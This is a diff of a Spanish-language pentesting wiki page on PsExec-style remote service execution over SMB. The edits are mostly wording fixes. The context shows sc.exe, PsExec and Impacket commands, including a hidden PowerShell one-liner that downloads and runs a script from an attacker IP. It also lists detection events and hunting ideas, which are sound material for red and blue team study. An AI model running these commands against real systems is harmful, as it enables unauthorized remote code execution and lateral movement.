@@ -9,13 +9,13 @@ Estas técnicas abusan del Administrador de Control de Servicios de Windows (SCM
 1. Autenticarse en el objetivo y acceder al recurso compartido ADMIN$ a través de SMB (TCP/445).
 2. Copiar un ejecutable o especificar una línea de comando LOLBAS que el servicio ejecutará.
 3. Crear un servicio de forma remota a través de SCM (MS-SCMR sobre \PIPE\svcctl) apuntando a ese comando o binario.
-4. Iniciar el servicio para ejecutar la carga útil y opcionalmente capturar stdin/stdout a través de un pipe con nombre.
+4. Iniciar el servicio para ejecutar la carga útil y, opcionalmente, capturar stdin/stdout a través de un pipe con nombre.
 5. Detener el servicio y limpiar (eliminar el servicio y cualquier binario dejado).
 
 Requisitos/prerrequisitos:
 - Administrador local en el objetivo (SeCreateServicePrivilege) o derechos explícitos de creación de servicios en el objetivo.
 - SMB (445) accesible y recurso compartido ADMIN$ disponible; Gestión de Servicios Remotos permitida a través del firewall del host.
-- Restricciones Remotas de UAC: con cuentas locales, el filtrado de tokens puede bloquear el acceso administrativo a través de la red a menos que se use el Administrador incorporado o LocalAccountTokenFilterPolicy=1.
+- Restricciones Remotas de UAC: con cuentas locales, el filtrado de tokens puede bloquear el acceso de administrador a través de la red a menos que se use el Administrador incorporado o LocalAccountTokenFilterPolicy=1.
 - Kerberos vs NTLM: usar un nombre de host/FQDN habilita Kerberos; conectarse por IP a menudo vuelve a NTLM (y puede ser bloqueado en entornos endurecidos).
 
 ### ScExec/WinExec manual a través de sc.exe
@@ -43,7 +43,7 @@ Encuentre pasos más detallados en: https://blog.ropnop.com/using-credentials-to
 
 ### Sysinternals PsExec.exe
 
-- Herramienta clásica de administración que utiliza SMB para dejar PSEXESVC.exe en ADMIN$, instala un servicio temporal (nombre predeterminado PSEXESVC) y hace proxy de I/O a través de tuberías con nombre.
+- Herramienta clásica de administración que utiliza SMB para dejar PSEXESVC.exe en ADMIN$, instala un servicio temporal (nombre predeterminado PSEXESVC) y proxy I/O a través de tuberías con nombre.
 - Ejemplos de uso:
 ```cmd
 :: Interactive SYSTEM shell on remote host
@@ -78,7 +78,7 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 # Change service name and output encoding
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
-Artifacts
+Artefactos
 - EXE temporal en C:\Windows\ (8 caracteres aleatorios). El nombre del servicio se establece de forma predeterminada en RemComSvc a menos que se sobrescriba.
 
 ### Impacket smbexec.py (SMBExec)
@@ -108,18 +108,18 @@ cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 
 Artefactos típicos de host/red al usar técnicas similares a PsExec:
 - Seguridad 4624 (Tipo de inicio de sesión 3) y 4672 (Privilegios especiales) en el objetivo para la cuenta de administrador utilizada.
-- Seguridad 5140/5145 Eventos de Compartición de Archivos y Detalles de Compartición de Archivos mostrando acceso ADMIN$ y creación/escritura de binarios de servicio (por ejemplo, PSEXESVC.exe o .exe aleatorio de 8 caracteres).
+- Seguridad 5140/5145 Eventos de Compartición de Archivos y Detalles de Compartición de Archivos mostrando acceso a ADMIN$ y creación/escritura de binarios de servicio (por ejemplo, PSEXESVC.exe o .exe aleatorio de 8 caracteres).
 - Seguridad 7045 Instalación de Servicio en el objetivo: nombres de servicio como PSEXESVC, RemComSvc, o personalizados (-r / -service-name).
 - Sysmon 1 (Creación de Proceso) para services.exe o la imagen del servicio, 3 (Conexión de Red), 11 (Creación de Archivo) en C:\Windows\, 17/18 (Tubería Creada/Conectada) para tuberías como \\.\pipe\psexesvc, \\.\pipe\remcom_*, o equivalentes aleatorios.
 - Artefacto de Registro para EULA de Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 en el host del operador (si no está suprimido).
 
 Ideas de caza
-- Alertar sobre instalaciones de servicios donde el ImagePath incluye cmd.exe /c, powershell.exe, o ubicaciones TEMP.
+- Alertar sobre instalaciones de servicios donde el ImagePath incluya cmd.exe /c, powershell.exe, o ubicaciones TEMP.
 - Buscar creaciones de procesos donde ParentImage sea C:\Windows\PSEXESVC.exe o hijos de services.exe ejecutándose como LOCAL SYSTEM ejecutando shells.
 - Marcar tuberías nombradas que terminen en -stdin/-stdout/-stderr o nombres de tuberías de clon de PsExec bien conocidos.
 
 ## Solución de problemas de fallos comunes
-- Acceso denegado (5) al crear servicios: no es realmente administrador local, restricciones remotas de UAC para cuentas locales, o protección contra manipulación de EDR en la ruta del binario del servicio.
+- Acceso denegado (5) al crear servicios: no es realmente administrador local, restricciones de UAC para cuentas locales, o protección contra manipulación de EDR en la ruta del binario del servicio.
 - La ruta de red no fue encontrada (53) o no se pudo conectar a ADMIN$: firewall bloqueando SMB/RPC o comparticiones de administrador deshabilitadas.
 - Kerberos falla pero NTLM está bloqueado: conectarse usando nombre de host/FQDN (no IP), asegurar SPNs adecuados, o proporcionar -k/-no-pass con tickets al usar Impacket.
 - El inicio del servicio se agota pero la carga útil se ejecutó: esperado si no es un binario de servicio real; capturar salida a un archivo o usar smbexec para I/O en vivo.
@@ -133,11 +133,13 @@ Ideas de caza
 
 - Ejecución remota basada en WMI (a menudo más sin archivos):
 
+
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
 - Ejecución remota basada en WinRM:
+
 
 {{#ref}}
 ./winrm.md
